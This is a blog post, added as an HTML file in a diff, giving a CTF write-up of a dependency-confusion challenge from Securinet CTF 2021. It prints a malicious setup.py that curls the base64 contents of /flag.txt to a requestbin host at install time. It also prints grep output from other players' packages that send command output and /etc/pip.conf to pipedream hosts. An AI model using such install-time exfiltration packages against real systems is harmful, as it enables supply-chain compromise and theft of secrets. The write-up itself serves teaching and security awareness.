@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Securinet CTF 2021 : Hack the Empire (884 pts, 19 solves)</title>
+  <meta name="description" content="Writeup for Securinet CTF 2021Hack the Empire">
+  <link rel="canonical" href="https://tlyrs7314.github.io/2021/03/23/SecurinetCTF2021-Hack-the-Empire.html">
+  <link rel="alternate" type="application/rss+xml" title="Std0r Feed"
+    href="https://tlyrs7314.github.io/feed.xml">
+  
+  <link rel="shortcut icon" href="/images/favicon.png" type="image/png" />
+  
+  <!-- Styles -->
+  <!--<link href="https://fonts.googleapis.com/css?family=Lato:400,400i,700,700i%7CNoto+Serif:400,400i,700,700i&display=swap" rel="stylesheet">-->
+  <link href="/assets/css/style.css" rel="stylesheet">
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.0/dist/katex.min.css" integrity="sha384-t5CR+zwDAROtph0PXGte6ia8heboACF9R5l/DiY+WZ3P2lxNgvJkQk5n7GPvLMYw" crossorigin="anonymous">
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.0/dist/katex.min.js" integrity="sha384-FaFLTlohFghEIZkw6VGwmf9ISTubWAVYW8tG8+w2LAIftJEULZABrF9PPFv+tVkH" crossorigin="anonymous"></script>
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.0/dist/contrib/auto-render.min.js" integrity="sha384-bHBqxz8fokvgoJ/sc17HODNxa42TlaEhB+w8ZJXTc2nZf1VgEaFZeZvT4Mznfz0v" crossorigin="anonymous"
+    onload="renderMathInElement(document.body, { 'delimiters': [
+  {left: '$$', right: '$$', display: true},
+  {left: '$', right: '$', display: false},
+  {left: '\\(', right: '\\)', display: false},
+  {left: '\\begin{equation}', right: '\\end{equation}', display: true},
+  {left: '\\begin{align}', right: '\\end{align}', display: true},
+  {left: '\\begin{alignat}', right: '\\end{alignat}', display: true},
+  {left: '\\begin{gather}', right: '\\end{gather}', display: true},
+  {left: '\\begin{CD}', right: '\\end{CD}', display: true},
+  {left: '\\[', right: '\\]', display: true}
+] });"></script>
+
+</head>
+<body>
+
+  <div id="page" class="site">
+    <div class="inner">
+      <header class="site-header">
+  
+  <p class="site-title"><a class="logo-text" href="/">Std0r</a></p>
+  
+  <nav class="site-navigation">
+    <div class="site-navigation-wrap">
+      <h2 class="screen-reader-text">Main navigation</h2>
+      <ul class="menu">
+        
+        
+        
+        <li class="menu-item ">
+          <a class="" href="/archive">Archive</a>
+        </li>
+        
+      </ul><!-- .menu -->
+      <button id="menu-close" class="menu-toggle"><span class="screen-reader-text">Close Menu</span><span
+          class="icon-close" aria-hidden="true"></span></button>
+    </div><!-- .site-navigation-wrap -->
+  </nav><!-- .site-navigation -->
+  <button id="menu-open" class="menu-toggle"><span class="screen-reader-text">Open Menu</span><span class="icon-menu" aria-hidden="true"></span></button>
+</header>
+
+
+
+      <main class="main-content fadeInDown delay_075s">
+
+  <article class="post">
+    <header class="post-header">
+      <time class="post-date" datetime="2021-03-23">March 23, 2021</time>
+      <h1 class="post-title">Securinet CTF 2021 : Hack the Empire (884 pts, 19 solves)</h1>
+      <div class="post-meta">
+        By <span class="post-author">Stdor</span><span class="post-tags"> in <a href="/tags#ctf" rel="tag">ctf</a>, <a href="/tags#ctf-writeups" rel="tag">ctf-writeups</a>, <a href="/tags#ctf-misc" rel="tag">ctf-misc</a></span>
+      </div><!-- .post-meta -->
+      
+    </header><!-- .post-header -->
+    <div class="post-content">
+      <p>Package managers are wonderful solutions to dependency issues, and they provide a simple interface for developers to install libraries. But what’s working behind when you’re typing that <code class="language-plaintext highlighter-rouge">pip</code>, <code class="language-plaintext highlighter-rouge">npm</code>, ..? This cool challenge highlights some of the potential pitfalls due to misconfigurations.</p>
+
+<!--more-->
+
+<h1 id="the-challenge">The challenge</h1>
+
+<blockquote>
+  <p>An enemy of The Empire have a job for you. As an adversary he want to hack CTFQ21EmpireTmp. He heard that in their server is hosting their holy flag in /flag.txt</p>
+
+  <p>No IP address is needed in this task. Good luck.</p>
+
+  <p>̿̿ ̿̿ ̿̿ ̿’̿’\̵͇̿̿\з= ( ▀ ͜͞ʖ▀) =ε/̵͇̿̿/’̿’̿ ̿ ̿̿ ̿̿ ̿̿</p>
+
+  <p>Important: Whatever was the solution that you’re going to adopt, if you want to use webhooks, DO NOT USE any of those that allows other participants to see the flag (don’t use webhook.site, you may let other participants to catch the flag from there) (for example you can use requestbin instead of webhook.site since the flag can be seen by the authenticated user). Think about using a method that will not leave anybody else to read the flag from your steps. And don’t forget to remove your work after you solve the task to avoid anybody else to steal it.</p>
+
+  <p>Hint 1: find the original web page (in the original website) that was sharing what you’ve found since that page is not updated</p>
+
+  <p>Author: TheEmperors</p>
+</blockquote>
+
+<h1 id="writeup">Writeup</h1>
+
+<blockquote>
+  <p><strong>Note</strong>: This is not quite the intended solution as I have skipped some steps and went in the wrong direction. You can refer to the the <a href="https://github.com/mohamedaymenkarmous/CTF/tree/master/CTFSecurinetsQuals2021#hack-the-empire">official writeup</a> from the  awesome author :)</p>
+</blockquote>
+
+<p>The only thing provided is the keyword <code class="language-plaintext highlighter-rouge">CTFQ21EmpireTmp</code>, so we’ll google that. We come across this <a href="https://stackoverflow.com/questions/66717285/is-there-any-limit-in-pythons-requirements-txt-during-the-installation">stackoverflow post</a>. Looks like the author is downloading python packages from a <strong>private repo</strong> with the name matching <code class="language-plaintext highlighter-rouge">ctf-q21-empire-tmp-[a-z0-9\-]{5,10}</code> every 5 minutes. The following configurations are used:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>global]
+extra-index-url <span class="o">=</span> http://&lt;private_IP_and_port&gt;/simple/
+trusted-host <span class="o">=</span> &lt;private_IP&gt;
+</code></pre></div></div>
+
+<p>Before I fully understand the above conclusion, I have already googled <code class="language-plaintext highlighter-rouge">ctf-q21-empire-tmp-</code>. The search results returned a package from PyPI (already removed at the time) and a mirror. So we pulled the source code from these two sites:</p>
+
+<ul>
+  <li>PyPI (luckily Google has cached the source code, so we were able to have a peak in it. Turns out it wasn’t intended.)</li>
+</ul>
+
+<p><img src="/images/2021-03-23-SecurinetCTF2021-Hack-the-Empire/pypi-package.png" alt="pypi-package" /></p>
+
+<p>I am initially confused by this, as the stackoverflow post says that they’re using a <strong>private repo</strong>, with ‘billions of packages’. Later I realize that it is a hint from the author (Though it’s still possible in a real-case scenario: think of a company owning a private repo publishing some of them to a public repo).</p>
+
+<ul>
+  <li>The mirror <a href="https://pypi.tuna.tsinghua.edu.cn/simple/">https://pypi.tuna.tsinghua.edu.cn/simple/</a></li>
+</ul>
+
+<p><img src="/images/2021-03-23-SecurinetCTF2021-Hack-the-Empire/mirror-package.png" alt="mirror-package" /></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">setup.py</code> across different versions are more or less the same - they send the output of a command to a server. So I filter the scripts with the command <code class="language-plaintext highlighter-rouge">grep -rin requests.get.*</code>. It gives the following output:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ctf</span><span class="o">-</span><span class="n">q21</span><span class="o">-</span><span class="n">empire</span><span class="o">-</span><span class="n">tmp</span><span class="o">-</span><span class="n">bw13434</span><span class="o">-</span><span class="mf">0.1</span><span class="p">.</span><span class="mi">3</span><span class="o">/</span><span class="n">setup</span><span class="p">.</span><span class="n">py</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span>        <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"https://ene63d9dv33i6ch.m.pipedream.net/?hehe="</span><span class="o">+</span><span class="n">os</span><span class="p">.</span><span class="n">popen</span><span class="p">(</span><span class="s">"pwd"</span><span class="p">).</span><span class="n">read</span><span class="p">())</span> <span class="c1">#cat /flag.txt | base64").read())
+</span><span class="n">ctf_q21_empire_tmp_bw13434</span><span class="o">-</span><span class="mf">0.0</span><span class="p">.</span><span class="mi">5</span><span class="o">/</span><span class="n">setup</span><span class="p">.</span><span class="n">py</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"https://ene63d9dv33i6ch.m.pipedream.net/?hehe="</span><span class="o">+</span><span class="n">os</span><span class="p">.</span><span class="n">popen</span><span class="p">(</span><span class="s">"id"</span><span class="p">).</span><span class="n">read</span><span class="p">())</span> <span class="c1">#cat /flag.txt | base64").read())
+</span><span class="n">ctf</span><span class="o">-</span><span class="n">q21</span><span class="o">-</span><span class="n">empire</span><span class="o">-</span><span class="n">tmp</span><span class="o">-</span><span class="n">bw13434</span><span class="o">-</span><span class="mf">0.0</span><span class="p">.</span><span class="mi">9</span><span class="o">/</span><span class="n">setup</span><span class="p">.</span><span class="n">py</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span>        <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"https://ene63d9dv33i6ch.m.pipedream.net/?hehe="</span><span class="o">+</span><span class="n">os</span><span class="p">.</span><span class="n">popen</span><span class="p">(</span><span class="s">"id"</span><span class="p">).</span><span class="n">read</span><span class="p">())</span> <span class="c1">#cat /flag.txt | base64").read())
+</span><span class="n">ctf</span><span class="o">-</span><span class="n">q21</span><span class="o">-</span><span class="n">empire</span><span class="o">-</span><span class="n">tmp</span><span class="o">-</span><span class="n">bw42069</span><span class="o">-</span><span class="mf">0.0</span><span class="p">.</span><span class="mi">9</span><span class="o">/</span><span class="n">setup</span><span class="p">.</span><span class="n">py</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span>        <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"https://enc2i9ljmjy100e.m.pipedream.net/?hehe="</span><span class="o">+</span><span class="n">os</span><span class="p">.</span><span class="n">popen</span><span class="p">(</span><span class="s">"cat /flag.txt | base64"</span><span class="p">).</span><span class="n">read</span><span class="p">())</span>
+<span class="n">ctf</span><span class="o">-</span><span class="n">q21</span><span class="o">-</span><span class="n">empire</span><span class="o">-</span><span class="n">tmp</span><span class="o">-</span><span class="n">bw13434</span><span class="o">-</span><span class="mf">0.1</span><span class="p">.</span><span class="mi">12</span><span class="o">/</span><span class="n">setup</span><span class="p">.</span><span class="n">py</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span>        <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"https://ene63d9dv33i6ch.m.pipedream.net/?hehe="</span><span class="o">+</span><span class="n">os</span><span class="p">.</span><span class="n">popen</span><span class="p">(</span><span class="s">"id"</span><span class="p">).</span><span class="n">read</span><span class="p">())</span> <span class="c1">#cat /flag.txt | base64").read())
+</span><span class="n">ctf</span><span class="o">-</span><span class="n">q21</span><span class="o">-</span><span class="n">empire</span><span class="o">-</span><span class="n">tmp</span><span class="o">-</span><span class="n">bw13434</span><span class="o">-</span><span class="mf">0.1</span><span class="p">.</span><span class="mi">13</span><span class="o">/</span><span class="n">setup</span><span class="p">.</span><span class="n">py</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span>        <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"https://ene63d9dv33i6ch.m.pipedream.net/?hehe="</span><span class="o">+</span><span class="n">os</span><span class="p">.</span><span class="n">popen</span><span class="p">(</span><span class="s">"cat /etc/flag"</span><span class="p">).</span><span class="n">read</span><span class="p">())</span> <span class="c1">#cat /flag.txt | base64").read())
+</span><span class="n">ctf</span><span class="o">-</span><span class="n">q21</span><span class="o">-</span><span class="n">empire</span><span class="o">-</span><span class="n">tmp</span><span class="o">-</span><span class="n">bw13434</span><span class="o">-</span><span class="mf">0.1</span><span class="p">.</span><span class="mi">2</span><span class="o">/</span><span class="n">setup</span><span class="p">.</span><span class="n">py</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="c1">#        requests.get("https://ene63d9dv33i6ch.m.pipedream.net/?hehe="+os.popen("id").read()) #cat /flag.txt | base64").read())
+</span><span class="n">ctf</span><span class="o">-</span><span class="n">q21</span><span class="o">-</span><span class="n">empire</span><span class="o">-</span><span class="n">tmp</span><span class="o">-</span><span class="n">bw13434</span><span class="o">-</span><span class="mf">0.1</span><span class="p">.</span><span class="mi">5</span><span class="o">/</span><span class="n">setup</span><span class="p">.</span><span class="n">py</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span>        <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"https://ene63d9dv33i6ch.m.pipedream.net/?hehe="</span><span class="o">+</span><span class="n">os</span><span class="p">.</span><span class="n">popen</span><span class="p">(</span><span class="s">"pwd"</span><span class="p">).</span><span class="n">read</span><span class="p">())</span> <span class="c1">#cat /flag.txt | base64").read())
+</span><span class="n">ctf</span><span class="o">-</span><span class="n">q21</span><span class="o">-</span><span class="n">empire</span><span class="o">-</span><span class="n">tmp</span><span class="o">-</span><span class="n">bw13434</span><span class="o">-</span><span class="mf">0.1</span><span class="p">.</span><span class="mi">8</span><span class="o">/</span><span class="n">setup</span><span class="p">.</span><span class="n">py</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"https://ene63d9dv33i6ch.m.pipedream.net/?hehe="</span><span class="o">+</span><span class="n">os</span><span class="p">.</span><span class="n">popen</span><span class="p">(</span><span class="s">"ls /var/www/"</span><span class="p">).</span><span class="n">read</span><span class="p">())</span> <span class="c1">#cat /flag.txt | base64").read())
+</span><span class="n">ctf</span><span class="o">-</span><span class="n">q21</span><span class="o">-</span><span class="n">empire</span><span class="o">-</span><span class="n">tmp</span><span class="o">-</span><span class="n">bw13434</span><span class="o">-</span><span class="mf">0.0</span><span class="p">.</span><span class="mi">7</span><span class="o">/</span><span class="n">setup</span><span class="p">.</span><span class="n">py</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"https://ene63d9dv33i6ch.m.pipedream.net/?hehe="</span><span class="o">+</span><span class="n">os</span><span class="p">.</span><span class="n">popen</span><span class="p">(</span><span class="s">"id"</span><span class="p">).</span><span class="n">read</span><span class="p">())</span> <span class="c1">#cat /flag.txt | base64").read())
+</span><span class="n">ctf</span><span class="o">-</span><span class="n">q21</span><span class="o">-</span><span class="n">empire</span><span class="o">-</span><span class="n">tmp</span><span class="o">-</span><span class="n">bw13434</span><span class="o">-</span><span class="mf">0.1</span><span class="p">.</span><span class="mi">9</span><span class="o">/</span><span class="n">setup</span><span class="p">.</span><span class="n">py</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"https://ene63d9dv33i6ch.m.pipedream.net/?hehe="</span><span class="o">+</span><span class="n">os</span><span class="p">.</span><span class="n">popen</span><span class="p">(</span><span class="s">"ls /var/www/ | base64"</span><span class="p">).</span><span class="n">read</span><span class="p">())</span> <span class="c1">#cat /flag.txt | base64").read())
+</span><span class="n">ctf</span><span class="o">-</span><span class="n">q21</span><span class="o">-</span><span class="n">empire</span><span class="o">-</span><span class="n">tmp</span><span class="o">-</span><span class="mi">1337420</span><span class="o">-</span><span class="mf">0.0</span><span class="p">.</span><span class="mi">9</span><span class="o">/</span><span class="n">setup</span><span class="p">.</span><span class="n">py</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span>        <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"https://enc2i9ljmjy100e.m.pipedream.net/?hehe="</span><span class="o">+</span><span class="n">os</span><span class="p">.</span><span class="n">popen</span><span class="p">(</span><span class="s">"cat /etc/pip.conf | base64"</span><span class="p">).</span><span class="n">read</span><span class="p">())</span>
+<span class="n">ctf</span><span class="o">-</span><span class="n">q21</span><span class="o">-</span><span class="n">empire</span><span class="o">-</span><span class="n">tmp</span><span class="o">-</span><span class="n">bw13434</span><span class="o">-</span><span class="mf">0.1</span><span class="p">.</span><span class="mi">11</span><span class="o">/</span><span class="n">setup</span><span class="p">.</span><span class="n">py</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span>        <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"https://ene63d9dv33i6ch.m.pipedream.net/?hehe="</span><span class="o">+</span><span class="n">os</span><span class="p">.</span><span class="n">popen</span><span class="p">(</span><span class="s">"id"</span><span class="p">).</span><span class="n">read</span><span class="p">())</span> <span class="c1">#cat /flag.txt | base64").read())
+</span><span class="n">ctf</span><span class="o">-</span><span class="n">q21</span><span class="o">-</span><span class="n">empire</span><span class="o">-</span><span class="n">tmp</span><span class="o">-</span><span class="n">bw13434</span><span class="o">-</span><span class="mf">0.1</span><span class="p">.</span><span class="mi">6</span><span class="o">/</span><span class="n">setup</span><span class="p">.</span><span class="n">py</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"https://ene63d9dv33i6ch.m.pipedream.net/?hehe="</span><span class="o">+</span><span class="n">os</span><span class="p">.</span><span class="n">popen</span><span class="p">(</span><span class="s">"pwd"</span><span class="p">).</span><span class="n">read</span><span class="p">())</span> <span class="c1">#cat /flag.txt | base64").read())
+</span><span class="n">ctf</span><span class="o">-</span><span class="n">q21</span><span class="o">-</span><span class="n">empire</span><span class="o">-</span><span class="n">tmp</span><span class="o">-</span><span class="n">bw13434</span><span class="o">-</span><span class="mf">0.0</span><span class="p">.</span><span class="mi">6</span><span class="o">/</span><span class="n">setup</span><span class="p">.</span><span class="n">py</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"https://ene63d9dv33i6ch.m.pipedream.net/?hehe="</span><span class="o">+</span><span class="n">os</span><span class="p">.</span><span class="n">popen</span><span class="p">(</span><span class="s">"id"</span><span class="p">).</span><span class="n">read</span><span class="p">())</span> <span class="c1">#cat /flag.txt | base64").read())
+</span><span class="p">...</span>
+</code></pre></div></div>
+<p>We further analyze the endpoints with <code class="language-plaintext highlighter-rouge">grep -rin "http.*?" -o | sort | uniq </code>, and found out that there are only three links:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://en4r9c8fvgmzozb.m.pipedream.net
+https://enc2i9ljmjy100e.m.pipedream.net
+https://ene63d9dv33i6ch.m.pipedream.net
+</code></pre></div></div>
+<p>Now that seems like people are uploading python packages as payloads in order to run commands on the server. After some more googling I found <a href="https://pydist.com/blog/extra-index-url">this article</a>, which suggests that the server could be pulling packages matching <code class="language-plaintext highlighter-rouge">ctf-q21-empire-tmp-[a-z0-9\-]{5,10}</code> from the <strong>public repo PyPI instead of a private one</strong>. That means we could upload a malicious package as a payload to the PyPI and the server will trust and install it.</p>
+
+<p>So I followed <a href="https://packaging.python.org/tutorials/packaging-projects/">this guide</a> to craft a package. The <code class="language-plaintext highlighter-rouge">setup.py</code> is as follows (modified from the cached package):</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">setuptools</span> <span class="kn">import</span> <span class="n">setup</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">from</span> <span class="nn">setuptools.command.install</span> <span class="kn">import</span> <span class="n">install</span>
+
+<span class="k">class</span> <span class="nc">PostInstallCommand</span><span class="p">(</span><span class="n">install</span><span class="p">):</span>
+    <span class="s">"""Post-installation for installation mode."""</span>
+    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">install</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span>
+        <span class="c1"># PUT YOUR POST-INSTALL SCRIPT HERE or CALL A FUNCTION
+</span>        <span class="c1">#os.popen("pwd")
+</span><span class="n">setup</span><span class="p">(</span>
+    <span class="n">name</span><span class="o">=</span><span class="s">'ctf-q21-empire-tmp-bw134346'</span><span class="p">,</span>
+    <span class="n">description</span><span class="o">=</span><span class="s">'Bye world'</span><span class="p">,</span>
+    <span class="n">version</span><span class="o">=</span><span class="s">'0.9.6'</span><span class="p">,</span>
+    <span class="n">packages</span><span class="o">=</span><span class="p">[</span><span class="s">'main'</span><span class="p">],</span>
+    <span class="n">setup_requires</span><span class="o">=</span><span class="p">[</span>
+        <span class="s">'requests'</span><span class="p">,</span>
+    <span class="p">],</span>
+    <span class="n">cmdclass</span><span class="o">=</span><span class="p">{</span>
+        <span class="s">'install'</span><span class="p">:</span> <span class="n">PostInstallCommand</span><span class="p">,</span>
+    <span class="p">},</span>
+<span class="p">)</span>
+
+<span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">'curl "https://requestbin.net/r/gf5gqdpw?hehe=$(cat /flag.txt | base64 -w 0)"'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>We need <code class="language-plaintext highlighter-rouge">base64 -w 0</code> because by default it inserts an <code class="language-plaintext highlighter-rouge">\n</code> after every 76 characters. The command would not work with end line characters.</p>
+
+<p>Then, after a short wait, the requestbin showed this result:</p>
+
+<p><img src="/images/2021-03-23-SecurinetCTF2021-Hack-the-Empire/requestbin.png" alt="requestbin-b64.png" /></p>
+
+<p>Which translates into</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>This is what we call 'Dependency confusion'
+that is well explained here (this is not my article but I liked it) https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610 .
+ Which is part of the Open Source Software Supply Chain Attacks.
+Flag: Securinets{D3P3Nd3ncy_C0nFu5!n_xD_were_you_confused_enough}
+We didn't want to make it more difficult to take in consideration what all the teams need as requirements. This is why for the time being we are not requesting difficult task (just read this file is enough) but the missconfiguration here is tied with the --extra-index-url. You can check the /etc/pip.conf if you are curious to see if this is a real task or was it faked.
+</code></pre></div></div>
+
+<p>flag: <code class="language-plaintext highlighter-rouge">Securinets{D3P3Nd3ncy_C0nFu5!n_xD_were_you_confused_enough}</code></p>
+
+<h1 id="afterwords">Afterwords</h1>
+
+<p>It’s a really interesting challenge that shows using package managers could be a security risk if you are not aware of what you are doing. In the challenge, the loophole stems from the fact that the adminstrator thinks that <strong>only packages from the private repo</strong> are installed, and puts unconditional trust in them; while in reality the misconfigured <code class="language-plaintext highlighter-rouge">pip</code> command searches from the <strong>public repo</strong>.</p>
+
+<p>For normal package manager users, there is also a take away: don’t install random packages from a repo because you think $``$pip/npm/apt has been installing right &amp; secure packages for me$”$. In fact, when solving the challenge I received some requests called by <code class="language-plaintext highlighter-rouge">setup.py</code> not from the server, but most probably from other ctf players. By doing so you could leak important credentials to malicious attackers. Fortunately they did not return any significant credentials, as I only tried commands like  <code class="language-plaintext highlighter-rouge">whoami / id</code> as a PoC. You should also avoid running <code class="language-plaintext highlighter-rouge">sudo pip</code> from now on.</p>
+
+    </div><!-- .post-content -->
+    <div class="post-share">
+      <span>Share:</span>
+      <a target="_blank"
+        href="https://twitter.com/intent/tweet?text=Securinet%20CTF%202021%20:%20Hack%20the%20Empire%20(884%20pts,%2019%20solves)&amp;url=https://tlyrs7314.github.io/2021/03/23/SecurinetCTF2021-Hack-the-Empire.html" rel="noopener">Twitter</a>
+    </div><!-- .share-post -->
+  </article><!-- .post -->
+
+  
+
+</main><!-- .main-content -->
+
+      <footer class="site-footer">
+  <div class="offsite-links">
+    
+      
+<a href="https://github.com/tlyrs7314" target="_blank" rel="noopener">
+  <span class="fa-github" aria-hidden="true"></span>
+  <span class="screen-reader-text">GitHub</span>
+</a>
+
+<a href="/feed.xml" target="_blank" rel="noopener">
+  <span class="fa-rss" aria-hidden="true"></span>
+  <span class="screen-reader-text">RSS</span>
+</a>
+
+    
+  </div><!-- .offsite-links -->
+  <div class="footer-bottom">
+    <div class="site-info">
+      <p>© Stdor 2021. Theme adapted from <a href="https://justgoodthemes.com/ghost-themes/scriptor">Scriptor</a>.</p>
+
+    </div><!-- .site-info -->
+    <a href="#page" id="back-to-top" class="back-to-top"><span class="screen-reader-text">Back to the top </span>&#8593;</a>
+  </div><!-- .footer-bottom -->
+</footer><!-- .site-footer -->
+
+    </div><!-- .inner -->
+  </div><!-- .site -->
+
+  <!-- Scripts -->
+  
+  <script src="/assets/js/plugins.js"></script>
+  <script src="/assets/js/custom.js"></script>
+  <script>
+	// Add anchors on DOMContentLoaded
+	document.addEventListener('DOMContentLoaded', function(event) {
+	  anchors.add('h1:not(.post-title), h2:not(.post-title), h3, h4, h5, h6');
+	  anchors.remove('.site-title');
+	});	
+  </script>
+
+</body>
+</html>
